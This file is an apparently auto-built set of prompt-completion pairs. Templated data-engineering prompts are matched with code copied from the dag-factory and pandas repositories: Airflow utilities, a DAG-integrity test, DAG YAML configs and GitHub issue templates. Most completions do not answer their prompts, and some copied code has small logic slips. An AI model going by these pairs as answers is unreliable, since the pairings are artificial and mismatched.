ast.parse(lambda_expr)\n    if len(tree.body) != 1 or not isinstance(tree.body[0], ast.Expr):\n        raise DagFactoryException(\"`lambda_expr` must be a single lambda\")\n    # the second parameter below is used only for logging\n    code = compile(tree, \"lambda_expr_to_callable.py\", \"exec\")\n    python_callable = types.LambdaType(code.co_consts[0], {})\n\n    return python_callable\n\n\ndef check_dict_key(item_dict: Dict[str, Any], key: str) -> bool:\n    \"\"\"\n    Check if the key is included in given dictionary, and has a valid value.\n\n    :param item_dict: a dictionary to test\n    :type item_dict: Dict[str, Any]\n    :param key: a key to test\n    :type key: str\n    :return: result to check\n    :type: bool\n    \"\"\"\n    return bool(key in item_dict and item_dict[key] is not None)\n\n\ndef convert_to_snake_case(input_string: str) -> str:\n    \"\"\"\n    Converts the string to snake case if camel case.\n\n    :param input_string: the string to be converted\n    :type input_string: str\n    :return: string converted to snake case\n    :type: str\n    \"\"\"\n    # pylint: disable=line-too-long\n    # source: https://www.geeksforgeeks.org/python-program-to-convert-camel-case-string-to-snake-case/\n    return \"\".join(\"_\" + i.lower() if i.isupper() else i for i in input_string).lstrip(\"_\")\n\n\ndef check_template_searchpath(template_searchpath: Union[str, List[str]]) -> bool:\n    \"\"\"\n    Check if template_searchpath is valid\n    :param template_searchpath: a list or str to test\n    :type template_searchpath: Union[str, List[str]]\n    :return: result to check\n    :type: bool\n    \"\"\"\n    if isinstance(template_searchpath, str):\n        if not os.path.isabs(template_searchpath):\n            raise DagFactoryException(\"template_searchpath must be absolute paths\")\n        if not os.path.isdir(template_searchpath):\n            raise DagFactoryException(\"template_searchpath must be existing paths\")\n        return True\n    if isinstance(template_searchpath, list):\n        for path in template_searchpath:\n            if not os.path.isabs(path):\n                raise DagFactoryException(\"template_searchpath must be absolute paths\")\n            if not os.path.isdir(path):\n                raise DagFactoryException(\"template_searchpath must be existing paths\")\n        return True\n    return False\n\n\ndef get_expand_partial_kwargs(\n    task_params: Dict[str, Any]\n) -> Tuple[Dict[str, Any], Dict[str, Union[Dict[str, Any], Any]], Dict[str, Union[Dict[str, Any], Any]]]:\n    \"\"\"\n    Getting expand and partial kwargs if existed from task_params\n    :param task_params: a dictionary with original task params from yaml\n    :type task_params: Dict[str, Any]\n    :return: dictionaries with task parameters\n    :type: Tuple[\n    Dict[str, Any],\n    Dict[str, Union[Dict[str, Any], Any]],\n    Dict[str, Union[Dict[str, Any], Any]],\n    \"\"\"\n\n    expand_kwargs: Dict[str, Union[Dict[str, Any], Any]] = {}\n    partial_kwargs: Dict[str, Union[Dict[str, Any], Any]] = {}\n    for expand_key, expand_value in task_params[\"expand\"].items():\n        expand_kwargs[expand_key] = expand_value\n    # remove dag-factory specific parameter\n    del task_params[\"expand\"]\n    if check_dict_key(task_params, \"partial\"):\n        for partial_key, partial_value in task_params[\"partial\"].items():\n            partial_kwargs[partial_key] = partial_value\n        # remove dag-factory specific parameter\n        del task_params[\"partial\"]\n    return task_params, expand_kwargs, partial_kwargs\n\n\ndef is_partial_duplicated(partial_kwargs: Dict[str, Any], task_params: Dict[str, Any]) -> bool:\n    \"\"\"\n    Check if there are duplicated keys in partial_kwargs and task_params\n    :param partial_kwargs: a partial kwargs to check duplicates in\n    :type partial_kwargs: Dict[str, Any]\n    :param task_params: a task params kwargs to check duplicates\n    :type task_params: Dict[str, Any]\n    :return: is there are duplicates\n    :type: bool\n    \"\"\"\n\n    for key in partial_kwargs:\n        task_duplicated_kwarg = task_params.get(key, None)\n    if task_duplicated_kwarg is not None:\n        raise DagFactoryException(\"Duplicated partial kwarg! It's already in task_params.\")\n    return False\n\n\ndef get_datasets_uri_yaml_file(file_path: str, datasets_filter: str) -> List[str]:\n    \"\"\"\n    Retrieves the URIs of datasets from a YAML file based on a given filter.\n\n    :param file_path: The path to the YAML file.\n    :type file_path: str\n    :param datasets_filter: A list of dataset names to filter the results.\n    :type datasets_filter: List[str]\n    :return: A list of dataset URIs that match the filter.\n    :rtype: List[str]\n    \"\"\"\n    try:\n        with open(file_path, \"r\", encoding=\"UTF-8\") as file:\n            data = yaml.safe_load(file)\n\n            datasets = data.get(\"datasets\", [])\n            datasets_result_uri = [\n                dataset[\"uri\"] for dataset in datasets if dataset[\"name\"] in datasets_filter and \"uri\" in dataset\n            ]\n            return datasets_result_uri\n    except FileNotFoundError:\n        logging.error(\"Error: File '%s' not found.\", file_path)\n        raise\n\n\ndef get_datasets_map_uri_yaml_file(file_path: str, datasets_filter: str) -> Dict[str, str]:\n    \"\"\"\n    Retrieves the URIs of datasets from a YAML file based on a given filter.\n\n    :param file_path: The path to the YAML file.\n    :type file_path: str\n    :param datasets_filter: A list of dataset names to filter the results.\n    :type datasets_filter: List[str]\n    :return: A Dict of dataset URIs that match the filter.\n    :rtype: Dict[str, str]\n    \"\"\"\n    try:\n        with open(file_path, \"r\", encoding=\"UTF-8\") as file:\n            data = yaml.safe_load(file)\n\n            datasets = data.get(\"datasets\", [])\n            datasets_result_dict = {\n                dataset[\"name\"]: dataset[\"uri\"]\n                for dataset in datasets\n                if dataset[\"name\"] in datasets_filter and \"uri\" in dataset\n            }\n            return datasets_result_dict\n    except FileNotFoundError:\n        logging.error(\"Error: File '%s' not found.\", file_path)\n        raise\n\n\ndef extract_dataset_names(expression) -> List[str]:\n    dataset_pattern = r\"\\b[a-zA-Z_][a-zA-Z0-9_]*\\b\"\n    datasets = re.findall(dataset_pattern, expression)\n    return datasets\n\n\ndef extract_storage_names(expression) -> List[str]:\n    storage_pattern = r\"[a-zA-Z][a-zA-Z0-9+.-]*://[a-zA-Z0-9\\-_/\\.]+\"\n    storages = re.findall(storage_pattern, expression)\n    return storages\n\n\ndef make_valid_variable_name(uri) -> str:\n    return re.sub(r\"\\W|^(?=\\d)\", \"_\", uri)\n\n\ndef parse_list_datasets(datasets: Union[List[str], str]) -> str:\n    if isinstance(datasets, list):\n        datasets = \" & \".join(datasets)\n    return datasets\n\n\ndef get_json_serialized_callable(data_obj):\n    \"\"\"\n    Takes a dictionary object and returns a callable that\n    returns JSON serialized string. If it's already a string,\n    validates that it's valid JSON.\n\n    :param data_obj: dict or JSON-formatted str\n    :returns: callable returning JSON serialized str\n    \"\"\"\n    if isinstance(data_obj, dict):\n        serialized_json = json.dumps(data_obj)\n    elif isinstance(data_obj, str):\n        try:\n            # Validate JSON string\n            json.loads(data_obj)\n            serialized_json = data_obj\n        except json.JSONDecodeError as e:\n            raise ValueError(f\"Invalid JSON provided: {e}\")\n    else:\n        raise TypeError(f\"data_obj must be a dict or str, not {type(data_obj)}\")\n\n    return lambda **kwargs: serialized_json\n\n\ndef update_yaml_structure(data):\n    \"\"\"Convert an Airflow 2-style YAML DAG config to be compatible with Airflow 3.\n\n    This function updates the DAG YAML structure to match changes introduced in Airflow 3,\n    such as replacing deprecated fields (e.g., 'schedule_interval' → 'schedule') and\n    adjusting operator import paths to the new module layout.\n    \"\"\"\n    operator_map = {\n        \"airflow.operators.dummy_operator.DummyOperator\": \"airflow.providers.standard.operators.empty.EmptyOperator\",\n        \"airflow.operators.empty.EmptyOperator\": \"airflow.providers.standard.operators.empty.EmptyOperator\",\n        \"airflow.operators.bash.BashOperator\": \"airflow.providers.standard.operators.bash.BashOperator\",\n        \"airflow.operators.bash_operator.BashOperator\": \"airflow.providers.standard.operators.bash.BashOperator\",\n        \"airflow.operators.python_operator.PythonOperator\": \"airflow.providers.standard.operators.python.PythonOperator\",\n        \"airflow.operators.python.PythonOperator\": \"airflow.providers.standard.operators.python.PythonOperator\",\n        \"airflow.sensors.external_task.ExternalTaskSensor\": \"airflow.providers.standard.sensors.external_task.ExternalTaskSensor\",\n        \"airflow.sensors.external_task_sensor.ExternalTaskSensor\": \"airflow.providers.standard.sensors.external_task.ExternalTaskSensor\",\n        \"airflow.decorators.task\": \"airflow.sdk.definitions.decorators.task\",\n    }\n    if isinstance(data, dict):\n        keys_to_update = []\n        for key, value in data.items():\n            # Recursively process nested dictionaries or lists\n            if isinstance(value, (dict, list)):\n                update_yaml_structure(value)\n\n            # Mark keys to rename after loop (avoid modifying dict while iterating)\n            if key == \"schedule_interval\":\n                keys_to_update.append((\"schedule_interval\", \"schedule\"))\n            if key == \"operator\":\n                data[key] = operator_map[value] if operator_map.get(value) is not None else value\n\n        # Perform renames after iteration\n        for old_key, new_key in keys_to_update:\n            data[new_key] = data.pop(old_key)\n\n    elif isinstance(data, list):\n        for item in data:\n            update_yaml_structure(item)\n\n    return data\n\n\ndef cast_with_type(data):\n    \"\"\"Recursively cast dictionaries with a __type__ key.\"\"\"\n    if isinstance(data, dict):\n        # Handle typed list\n        if data.get(\"__type__\") == \"builtins.list\" and \"items\" in data:\n            return [cast_with_type(item) for item in data[\"items\"]]\n\n        # Normal typed dict\n        processed = {k: cast_with_type(v) for k, v in data.items() if k != \"__type__\"}\n\n        if \"__type__\" in data:\n            class_type = _import_from_string(data[\"__type__\"])\n            return class_type(**processed)\n\n        return processed\n\n    elif isinstance(data, list):\n        return [cast_with_type(item) for item in data]\n\n    return data\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dagfactory/utils.py", "language": "python", "complexity": "complex", "star_count": 1326, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"Test the validity of all DAGs. **USED BY DEV PARSE COMMAND DO NOT EDIT**\"\"\"\n\nimport logging\nimport os\nfrom contextlib import contextmanager\n\nimport pytest\nfrom airflow.hooks.base import BaseHook\nfrom airflow.models import Connection, DagBag, Variable\nfrom airflow.utils.db import initdb\n\n# init airflow database\ninitdb()\n\n# The following code patches errors caused by missing OS Variables, Airflow Connections, and Airflow Variables\n\n\n# =========== MONKEYPATCH BaseHook.get_connection() ===========\ndef basehook_get_connection_monkeypatch(key: str, *args, **kwargs):\n    print(f\"Attempted to fetch connection during parse returning an empty Connection object for {key}\")\n    return Connection(key)\n\n\nBaseHook.get_connection = basehook_get_connection_monkeypatch\n# # =========== /MONKEYPATCH BASEHOOK.GET_CONNECTION() ===========\n\n\n# =========== MONKEYPATCH OS.GETENV() ===========\ndef os_getenv_monkeypatch(key: str, *args, **kwargs):\n    default = None\n    if args:\n        default = args[0]  # os.getenv should get at most 1 arg after the key\n    if kwargs:\n        default = kwargs.get(\"default\", None)  # and sometimes kwarg if people are using the sig\n\n    env_value = os.environ.get(key, None)\n\n    if env_value:\n        return env_value  # if the env_value is set, return it\n    if key == \"JENKINS_HOME\" and default is None:  # fix https://github.com/astronomer/astro-cli/issues/601\n        return None\n    if default:\n        return default  # otherwise return whatever default has been passed\n    return f\"MOCKED_{key.upper()}_VALUE\"  # if absolutely nothing has been passed - return the mocked value\n\n\nos.getenv = os_getenv_monkeypatch\n# # =========== /MONKEYPATCH OS.GETENV() ===========\n\n# =========== MONKEYPATCH VARIABLE.GET() ===========\n\n\nclass magic_dict(dict):\n    def __init__(self, *args, **kwargs):\n        self.update(*args, **kwargs)\n\n    def __getitem__(self, key):\n        return {}.get(key, \"MOCKED_KEY_VALUE\")\n\n\n_no_default = object()  # allow falsey defaults\n\n\ndef variable_get_monkeypatch(key: str, default_var=_no_default, deserialize_json=False):\n    print(f\"Attempted to get Variable value during parse, returning a mocked value for {key}\")\n\n    if default_var is not _no_default:\n        return default_var\n    if deserialize_json:\n        return magic_dict()\n    return \"NON_DEFAULT_MOCKED_VARIABLE_VALUE\"\n\n\nVariable.get = variable_get_monkeypatch\n# # =========== /MONKEYPATCH VARIABLE.GET() ===========\n\n\n@contextmanager\ndef suppress_logging(namespace):\n    \"\"\"\n    Suppress logging within a specific namespace to keep tests \"clean\" during build\n    \"\"\"\n    logger = logging.getLogger(namespace)\n    old_value = logger.disabled\n    logger.disabled = True\n    try:\n        yield\n    finally:\n        logger.disabled = old_value\n\n\ndef get_import_errors():\n    \"\"\"\n    Generate a tuple for import errors in the dag bag, and include DAGs without errors.\n    \"\"\"\n    with suppress_logging(\"airflow\"):\n        dag_bag = DagBag(include_examples=False)\n\n        def strip_path_prefix(path):\n            return os.path.relpath(path, os.environ.get(\"AIRFLOW_HOME\"))\n\n        # Initialize an empty list to store the tuples\n        result = []\n\n        # Iterate over the items in import_errors\n        for k, v in dag_bag.import_errors.items():\n            result.append((strip_path_prefix(k), v.strip()))\n\n        # Check if there are DAGs without errors\n        for file_path in dag_bag.dags:\n            # Check if the file_path is not in import_errors, meaning no errors\n            if file_path not in dag_bag.import_errors:\n                result.append((strip_path_prefix(file_path), \"No import errors\"))\n\n        return result\n\n\n@pytest.mark.parametrize(\"rel_path, rv\", get_import_errors(), ids=[x[0] for x in get_import_errors()])\ndef test_file_imports(rel_path, rv):\n    \"\"\"Test for import errors on a file\"\"\"\n    if os.path.exists(\".astro/dag_integrity_exceptions.txt\"):\n        with open(\".astro/dag_integrity_exceptions.txt\", \"r\") as f:\n            exceptions = f.readlines()\n    print(f\"Exceptions: {exceptions}\")\n    if (rv != \"No import errors\") and rel_path not in exceptions:\n        # If rv is not \"No import errors,\" consider it a failed test\n        raise Exception(f\"{rel_path} failed to import with message \\n {rv}\")\n    else:\n        # If rv is \"No import errors,\" consider it a passed test\n        print(f\"{rel_path} passed the import test\")\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dev/.astro/test_dag_integrity_default.py", "language": "python", "complexity": "medium", "star_count": 1326, "quality_score": 0.8999999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "custom_example_dag:\n  description: \"this is an example dag\"\n  schedule_interval: \"@daily\"\n  catchup: false\n  render_template_as_native_obj: True\n  tasks:\n    task_1:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo 1\"\n      executor_config:\n        pod_override:\n          __type__: kubernetes.client.models.V1Pod\n          spec:\n            __type__: kubernetes.client.models.V1PodSpec\n            containers:\n              __type__: builtins.list\n              items:\n                - __type__: kubernetes.client.models.V1Container\n                  name: \"base\"\n                  resources:\n                    __type__: kubernetes.client.models.V1ResourceRequirements\n                    limits:\n                      cpu: \"1\"\n                      memory: \"1024Mi\"\n                    requests:\n                      cpu: \"0.5\"\n                      memory: \"512Mi\"\n    task_2:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo 2\"\n      dependencies: [task_1]\n    task_3:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo 2\"\n      dependencies: [task_1]\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dev/dags/airflow2/example_custom_py_object_dag.yml", "language": "yaml", "complexity": "simple", "star_count": 1326, "quality_score": 0.63, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "default:\n  default_args:\n    owner: \"default_owner\"\n    start_date: 2020-01-01\n  schedule_interval: \"0 1 * * *\"\n\nexample_breadfast:\n  default_args:\n    owner: \"custom_owner\"\n    start_date: 2 days\n  description: \"this is an customized operator dag\"\n  schedule_interval: \"0 3 * * *\"\n  catchup: false\n  tasks:\n    begin:\n      operator: airflow.operators.empty.EmptyOperator\n    make_bread_1:\n      operator: customized.operators.breakfast_operators.MakeBreadOperator\n      bread_type: 'Sourdough'\n      dependencies:\n        - begin\n    make_bread_2:\n      operator: customized.operators.breakfast_operators.MakeBreadOperator\n      bread_type: 'Multigrain'\n      dependencies:\n        - begin\n    make_coffee_1:\n      operator:  customized.operators.breakfast_operators.MakeCoffeeOperator\n      coffee_type: 'Black'\n      dependencies:\n        - begin\n        - make_bread_1\n        - make_bread_2\n    end:\n      operator: airflow.operators.empty.EmptyOperator\n      dependencies:\n        - begin\n        - make_bread_1\n        - make_bread_2\n        - make_coffee_1\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dev/dags/airflow2/example_customize_operator.yml", "language": "yaml", "complexity": "simple", "star_count": 1326, "quality_score": 0.6, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "default:\n  default_args:\n    start_date: '2024-01-01'\n  schedule_interval: 0 0 * * *\n  catchup: false\n  tags:\n    - \"data engineering\"\n\netl:\n  tasks:\n    extract:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo extract\"\n    transform:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo transform\"\n      dependencies:\n      - extract\n    load:\n      operator: airflow.operators.bash.BashOperator\n      bash_command: \"echo load\"\n      dependencies:\n      - transform\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": "dev/dags/airflow2/example_dag_factory_default_args.yml", "language": "yaml", "complexity": "simple", "star_count": 1326, "quality_score": 0.6, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Bug Report\ndescription: Report incorrect behavior in the pandas library\ntitle: \"BUG: \"\nlabels: [Bug, Needs Triage]\n\nbody:\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: Pandas version checks\n      options:\n        - label: >\n            I have checked that this issue has not already been reported.\n          required: true\n        - label: >\n            I have confirmed this bug exists on the\n            [latest version](https://pandas.pydata.org/docs/whatsnew/index.html) of pandas.\n          required: true\n        - label: >\n            I have confirmed this bug exists on the\n            [main branch](https://pandas.pydata.org/docs/dev/getting_started/install.html#installing-the-development-version-of-pandas)\n            of pandas.\n  - type: textarea\n    id: example\n    attributes:\n      label: Reproducible Example\n      description: >\n        Please follow [this guide](https://matthewrocklin.com/blog/work/2018/02/28/minimal-bug-reports) on how to\n        provide a minimal, copy-pastable example.\n      placeholder: >\n        import pandas as pd\n\n        df = pd.DataFrame(range(5))\n\n        ...\n      render: python\n    validations:\n      required: true\n  - type: textarea\n    id: problem\n    attributes:\n      label: Issue Description\n      description: >\n        Please provide a description of the issue shown in the reproducible example.\n    validations:\n      required: true\n  - type: textarea\n    id: expected-behavior\n    attributes:\n      label: Expected Behavior\n      description: >\n        Please describe or show a code example of the expected behavior.\n    validations:\n      required: true\n  - type: textarea\n    id: version\n    attributes:\n      label: Installed Versions\n      description: >\n        Please paste the output of ``pd.show_versions()``\n      value: >\n        <details>\n\n\n        Replace this line with the output of pd.show_versions()\n\n\n        </details>\n    validations:\n      required: true\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/bug_report.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Documentation Improvement\ndescription: Report wrong or missing documentation\ntitle: \"DOC: \"\nlabels: [Docs, Needs Triage]\n\nbody:\n  - type: checkboxes\n    attributes:\n      label: Pandas version checks\n      options:\n        - label: >\n            I have checked that the issue still exists on the latest versions of the docs\n            on `main` [here](https://pandas.pydata.org/docs/dev/)\n          required: true\n  - type: textarea\n    id: location\n    attributes:\n      label: Location of the documentation\n      description: >\n        Please provide the location of the documentation, e.g. \"pandas.read_csv\" or the\n        URL of the documentation, e.g.\n        \"https://pandas.pydata.org/docs/reference/api/pandas.read_csv.html\"\n      placeholder: https://pandas.pydata.org/docs/reference/api/pandas.read_csv.html\n    validations:\n      required: true\n  - type: textarea\n    id: problem\n    attributes:\n      label: Documentation problem\n      description: >\n        Please provide a description of what documentation you believe needs to be fixed/improved\n    validations:\n      required: true\n  - type: textarea\n    id: suggested-fix\n    attributes:\n      label: Suggested fix for documentation\n      description: >\n        Please explain the suggested fix and **why** it's better than the existing documentation\n    validations:\n      required: true\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/documentation_improvement.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Feature Request\ndescription: Suggest an idea for pandas\ntitle: \"ENH: \"\nlabels: [Enhancement, Needs Triage]\n\nbody:\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: Feature Type\n      description: Please check what type of feature request you would like to propose.\n      options:\n        - label: >\n            Adding new functionality to pandas\n        - label: >\n            Changing existing functionality in pandas\n        - label: >\n            Removing existing functionality in pandas\n  - type: textarea\n    id: description\n    attributes:\n      label: Problem Description\n      description: >\n        Please describe what problem the feature would solve, e.g. \"I wish I could use pandas to ...\"\n      placeholder: >\n        I wish I could use pandas to return a Series from a DataFrame when possible.\n    validations:\n      required: true\n  - type: textarea\n    id: feature\n    attributes:\n      label: Feature Description\n      description: >\n        Please describe how the new feature would be implemented, using pseudocode if relevant.\n      placeholder: >\n        Add a new parameter to DataFrame, to_series, to return a Series if possible.\n\n        def __init__(self, ..., to_series: bool=False):\n            \"\"\"\n            Parameters\n            ----------\n            ...\n\n            to_series : bool, default False\n                Return a Series if possible\n            \"\"\"\n            if to_series:\n                return Series(data)\n    validations:\n      required: true\n  - type: textarea\n    id: alternative\n    attributes:\n      label: Alternative Solutions\n      description: >\n        Please describe any alternative solution (existing functionality, 3rd party package, etc.)\n        that would satisfy the feature request.\n      placeholder: >\n        Write a custom function to return a Series when possible.\n\n        def to_series(...)\n           result = pd.DataFrame(...)\n           ...\n    validations:\n      required: true\n  - type: textarea\n    id: context\n    attributes:\n      label: Additional Context\n      description: >\n        Please provide any relevant GitHub issues, code examples or references that help describe and support\n        the feature request.\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/feature_request.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Installation Issue\ndescription: Report issues installing the pandas library on your system\ntitle: \"BUILD: \"\nlabels: [Build, Needs Triage]\n\nbody:\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: Installation check\n      options:\n        - label: >\n            I have read the [installation guide](https://pandas.pydata.org/pandas-docs/stable/getting_started/install.html#installing-pandas).\n          required: true\n  - type: input\n    id: platform\n    attributes:\n      label: Platform\n      description: >\n        Please provide the output of ``import platform; print(platform.platform())``\n    validations:\n      required: true\n  - type: dropdown\n    id: method\n    attributes:\n      label: Installation Method\n      description: >\n        Please provide how you tried to install pandas from a clean environment.\n      options:\n        - pip install\n        - conda install\n        - apt-get install\n        - Built from source\n        - Other\n    validations:\n      required: true\n  - type: input\n    id: pandas\n    attributes:\n      label: pandas Version\n      description: >\n        Please provide the version of pandas you are trying to install.\n    validations:\n      required: true\n  - type: input\n    id: python\n    attributes:\n      label: Python Version\n      description: >\n        Please provide the installed version of Python.\n    validations:\n      required: true\n  - type: textarea\n    id: logs\n    attributes:\n      label: Installation Logs\n      description: >\n        If possible, please copy and paste the installation logs when attempting to install pandas.\n      value: >\n        <details>\n\n\n        Replace this line with the installation logs.\n\n\n        </details>\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/installation_issue.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: PDEP Vote\ndescription: Call for a vote on a PDEP\ntitle: \"VOTE: \"\nlabels: [Vote]\n\nbody:\n  - type: markdown\n    attributes:\n      value: >\n        As per [PDEP-1](https://pandas.pydata.org/pdeps/0001-purpose-and-guidelines.html), the following issue template should be used when a\n        maintainer has opened a PDEP discussion and is ready to call for a vote.\n  - type: checkboxes\n    attributes:\n      label: Locked issue\n      options:\n        - label: >\n            I locked this voting issue so that only voting members are able to cast their votes or\n            comment on this issue.\n          required: true\n  - type: input\n    id: PDEP-name\n    attributes:\n      label: PDEP number and title\n      placeholder: >\n        PDEP-1: Purpose and guidelines\n    validations:\n      required: true\n  - type: input\n    id: PDEP-link\n    attributes:\n      label: Pull request with discussion\n      description: e.g. https://github.com/pandas-dev/pandas/pull/47444\n    validations:\n      required: true\n  - type: input\n    id: PDEP-rendered-link\n    attributes:\n      label: Rendered PDEP for easy reading\n      description: e.g. https://github.com/pandas-dev/pandas/pull/47444/files?short_path=7c449e6#diff-7c449e698132205b235c501f7e47ebba38da4d2b7f9492c98f16745dba787041\n    validations:\n      required: true\n  - type: input\n    id: PDEP-number-of-discussion-participants\n    attributes:\n      label: Discussion participants\n      description: >\n        You may find it useful to list or total the number of participating members in the\n        PDEP discussion PR. This would be the maximum possible disapprove votes.\n      placeholder: >\n        14 voting members participated in the PR discussion thus far.\n  - type: input\n    id: PDEP-vote-end\n    attributes:\n      label: Voting will close in 15 days.\n      description: The voting period end date. ('Voting will close in 15 days.' will be automatically written)\n  - type: markdown\n    attributes:\n      value: ---\n  - type: textarea\n    id: Vote\n    attributes:\n      label: Vote\n      value: |\n        Cast your vote in a comment below.\n        * +1: approve.\n        * 0: abstain.\n            * Reason: A one sentence reason is required.\n        * -1: disapprove\n            * Reason: A one sentence reason is required.\n        A disapprove vote requires prior participation in the linked discussion PR.\n\n        @pandas-dev/pandas-core\n    validations:\n      required: true\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/pdep_vote.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_processing", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create data processing pipeline for transformation and analysis using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Performance Issue\ndescription: Report slow performance or memory issues when running pandas code\ntitle: \"PERF: \"\nlabels: [Performance, Needs Triage]\n\nbody:\n  - type: checkboxes\n    id: checks\n    attributes:\n      label: Pandas version checks\n      options:\n        - label: >\n            I have checked that this issue has not already been reported.\n          required: true\n        - label: >\n            I have confirmed this issue exists on the\n            [latest version](https://pandas.pydata.org/docs/whatsnew/index.html) of pandas.\n          required: true\n        - label: >\n            I have confirmed this issue exists on the main branch of pandas.\n  - type: textarea\n    id: example\n    attributes:\n      label: Reproducible Example\n      description: >\n        Please provide a minimal, copy-pastable example that quantifies\n        [slow runtime](https://docs.python.org/3/library/timeit.html) or\n        [memory](https://pypi.org/project/memory-profiler/) issues.\n    validations:\n      required: true\n  - type: textarea\n    id: version\n    attributes:\n      label: Installed Versions\n      description: >\n        Please paste the output of ``pd.show_versions()``\n      value: >\n        <details>\n\n\n        Replace this line with the output of pd.show_versions()\n\n\n        </details>\n    validations:\n      required: true\n  - type: textarea\n    id: prior-performance\n    attributes:\n      label: Prior Performance\n      description: >\n        If applicable, please provide the prior version of pandas and output\n        of the same reproducible example where the performance issue did not exist.\n", "metadata": {"source": "github.com/pandas-dev/pandas", "file_path": ".github/ISSUE_TEMPLATE/performance_issue.yaml", "language": "yaml", "complexity": "simple", "star_count": 46101, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
